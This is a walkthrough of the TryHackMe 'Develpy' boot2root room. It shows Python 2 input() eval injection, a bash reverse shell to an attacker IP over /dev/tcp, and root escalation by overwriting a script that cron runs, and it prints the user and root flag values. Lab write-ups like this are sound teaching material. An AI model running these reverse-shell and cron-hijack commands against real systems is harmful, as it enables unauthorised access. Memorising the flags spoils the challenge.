---
title: "Develpy"
description: "A boot2root CTF machine focused on Python 2 input() code injection and cron job abuse for privilege escalation."
difficulty: "Medium"
tags: ["Python", "Code Injection", "Cron Job", "Privilege Escalation", "socat"]
date: "2026-07-04"
---

## Overview

![Develpy room cover](/assets/screenshots/develpy/cover.png)

Develpy is a boot2root machine from the bsides Guatemala CTF series on TryHackMe. The attack surface is a Python 2 script exposed on port 10000 that uses the dangerous `input()` function — which in Python 2 behaves like `eval()`, allowing arbitrary code execution. After gaining a shell as the `king` user, privilege escalation is achieved by abusing a cron job that executes a writable script as root.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Medium
- **Skills Learned:** Python 2 `input()` exploitation, cron job enumeration, cron-based privilege escalation

## Enumeration

### Nmap Scan

Started with an nmap scan to discover open ports:

```bash
nmap -sV -sC -p- 10.48.188.8
```

Two open ports were discovered:

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu |
| 10000/tcp | Custom Python service | snet-sensor-mgmt? |

![Nmap scan results](/assets/screenshots/develpy/nmap.png)

Port 10000 was the unusual one. Nmap's service scripts revealed that sending HTTP requests or generic lines to it triggered Python tracebacks referencing `input()`, confirming it was a custom Python service.

### Service Fingerprinting

Connecting to port 10000 with netcat showed a custom prompt:

```bash
nc 10.48.188.8 10000
```

The service displayed a banner — "Private 0days" — and asked for a number of exploits to send. Sending invalid input triggered a Python traceback that revealed the underlying code:

```python
num_exploits = int(input(' Please enther number of exploits to send??: '))
```

![Service error revealing input()](/assets/screenshots/develpy/service_error.png)

Sending a valid number (like `1`) returned a simulated exploit output with a ping-like response, confirming the script was functional.

![Script accepting valid input](/assets/screenshots/develpy/script_output.png)

## Initial Access — Python Code Injection

The vulnerability was in Python 2's `input()` function. Unlike Python 3, Python 2's `input()` evaluates the user's input as a Python expression before converting it to an integer. This is equivalent to wrapping the input with `eval()`, allowing arbitrary code execution.

The payload used the `__builtins__` module to access `os.system`:

```bash
__import__('os').system('cat /home/king/user.txt')
```

This returned the user flag directly within the service output.

![Payload execution showing user flag](/assets/screenshots/develpy/payload_result.png)

**User flag:** `cf85ff769cfaaa721758949bf870b019`

To obtain a proper interactive shell, sent a reverse shell payload:

```python
__import__('os').system('bash -c "bash -i >& /dev/tcp/10.8.95.227/4444 0>&1"')
```

On the attacker machine, a netcat listener caught the connection:

```bash
nc -lvnp 4444
```

The shell landed as user `king`:

![Reverse shell as king](/assets/screenshots/develpy/reverse_shell.png)

## Enumeration as king

Listing king's home directory revealed several files of interest:

| File | Description |
|------|-------------|
| `exploit.py` | The vulnerable Python 2 script |
| `run.sh` | Shell script that starts the service via socat |
| `root.sh` | A script owned by root but world-readable |
| `credentials.png` | A Mondrian-style image (possibly a Piet programming language challenge) |
| `.pid` | Process ID file for the socat listener |

![Spawned shell listing](/assets/screenshots/develpy/spawn_shell.png)

The user flag was in `user.txt`:

```bash
cat /home/king/user.txt
cf85ff769cfaaa721758949bf870b019
```

![User flag](/assets/screenshots/develpy/user_flag.png)

### Analyzing Scripts

The `run.sh` script showed how the Python service was started:

```bash
#!/bin/bash
kill cat /home/king/.pid
socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./exploit.py,pty,stderr,echo=0 &
echo $! > /home/king/.pid
```

It used `socat` to listen on port 10000 and spawn `exploit.py` for each connection.

The `root.sh` file contained:

```bash
python /root/company/media/*.py
```

This script was owned by root, but king's home directory is world-writable — meaning `root.sh` could be replaced.

![root.sh and run.sh files](/assets/screenshots/develpy/root_sh.png)
![run.sh contents](/assets/screenshots/develpy/run_sh.png)

## Privilege Escalation — Cron Job Abuse

Checked `/etc/crontab` to see what runs `root.sh`:

```bash
cat /etc/crontab
```

The crontab revealed three entries of interest:

```
* * * * * king  cd /home/king/ && bash run.sh
* * * * * root  cd /home/king/ && bash root.sh
* * * * * root  cd /root/company && bash run.sh
```

Every minute, root changed into king's home directory and executed `root.sh` as root. Since king has full write access to his own home directory, we can replace `root.sh` with a malicious script that root will execute.

![Crontab showing root executes root.sh](/assets/screenshots/develpy/crontab.png)

### Exploiting the Cron Job

The approach was to replace `root.sh` with a command that copies the root flag into king's directory:

```bash
rm root.sh
echo 'cp /root/root.txt /home/king/root.txt' > root.sh
```

After waiting for the cron job to execute (up to 60 seconds), the `root.txt` file appeared in king's directory:

```bash
cat /home/king/root.txt
9c37646777a53910a347f387dce025ec
```

![Root flag captured](/assets/screenshots/develpy/root_flag.png)

**Root flag:** `9c37646777a53910a347f387dce025ec`

An alternative approach is to replace `root.sh` with a reverse shell:

```bash
echo 'bash -i >& /dev/tcp/10.8.95.227/8081 0>&1' > root.sh
```

This would give root shell access instead of just copying the flag.

## Flags

| Flag | Value |
|------|-------|
| User | `cf85ff769cfaaa721758949bf870b019` |
| Root | `9c37646777a53910a347f387dce025ec` |

## Commands Used

```bash
nmap -sV -sC -p- <target-ip>
nc <target-ip> 10000
__import__('os').system('bash -c "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1"')
nc -lvnp 4444
cat /etc/crontab
rm root.sh && echo 'cp /root/root.txt /home/king/root.txt' > root.sh
```

## Lessons Learned

- **Python 2 `input()` is `eval()`** — In Python 2, `input()` evaluates user input as Python code before processing it. This makes it trivially exploitable for remote code execution. Python 3 fixed this by renaming the dangerous version to `input()` but only returning strings. Always check the Python version when auditing input handling.
- **Cron job privilege escalation** — When a privileged user executes a script from a directory that a lower-privileged user can write to, the lower-privileged user can replace that script and escalate privileges. Always check `/etc/crontab` and file permissions during post-exploitation.
- **socat for service exposure** — The `run.sh` script used `socat` to bind the Python script to a network port. This is a common technique in CTF challenges and real-world deployments alike.
- **The `__import__` function** — Python's `__import__('os')` is equivalent to `import os`, but can be called dynamically from within an expression, making it useful for one-liner code execution.

## References

- [TryHackMe — Develpy](https://tryhackme.com/room/bsidesgtdevelpy)
- [Python 2 input() vulnerability](http://intx0x80.blogspot.com/2017/05/python-input-vulnerability_25.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [GTFOBins](https://gtfobins.github.io/)
